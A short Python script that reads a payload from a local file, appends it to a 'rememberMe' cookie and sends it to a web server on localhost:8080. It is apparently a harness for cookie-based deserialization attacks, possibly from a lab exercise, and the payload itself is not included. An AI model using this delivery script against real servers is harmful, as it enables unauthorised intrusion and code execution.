import requests

payload = open("./2.txt").read()

header = {
    'User-agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
    'Cookie': 'a=1; rememberMe='
}
print(len(payload))
header['Cookie'] += payload
response = requests.get(headers=header, url="http://localhost:8080")
print(response.text)
